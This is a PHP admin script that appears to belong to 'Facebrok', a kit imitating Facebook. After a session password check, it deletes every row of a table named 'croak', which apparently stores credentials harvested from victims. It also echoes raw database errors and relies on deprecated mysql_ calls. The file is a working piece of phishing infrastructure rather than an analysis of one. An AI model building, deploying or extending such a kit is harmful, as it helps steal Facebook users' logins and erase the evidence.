<?php
// RedToor
// Configuration --------------------
include ("config.php");
//-----------------------------------
// are you man? ---------------------
session_start();
error_reporting(E_ALL^E_NOTICE);
if($_SESSION['user']){
//-----------------------------------
// Confirmation ---------------------
$pass=$_POST['pass'];
if ($pass==$_SESSION['pass']){
//-----------------------------------
// Connections
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
//-----------------------------------
echo '
<title>Facebrok - Clear</title><style type="text/css" media="screen">
<!--a:link   {text-decoration:none;}   -->
</style><link rel="shortcut icon" href="facebook.ico" />
<table width="100%" border="0" height="100%" cellspacing="0"><td valign="middle"><div align="center"><OBJECT classid>
<span style="color:#666"><span style="font-family: Arial;font-size:20">Done, Database EMPY.</span></span>
     ';
mysql_query("DELETE FROM croak WHERE id > 0") or die ('Failed Consult: '.mysql_error());
}else{
	echo '
<title>Facebrok - Clear</title><style type="text/css" media="screen">
<!--a:link   {text-decoration:none;}   -->
</style><link rel="shortcut icon" href="facebook.ico" />
<table width="100%" border="0" height="100%" cellspacing="0"><td valign="middle"><div align="center"><OBJECT classid>
<span style="color:#666"><span style="font-family: Arial;font-size:20">Password Wrong.</span></span>
     ';
}} else {header("location:../croak");}
?>
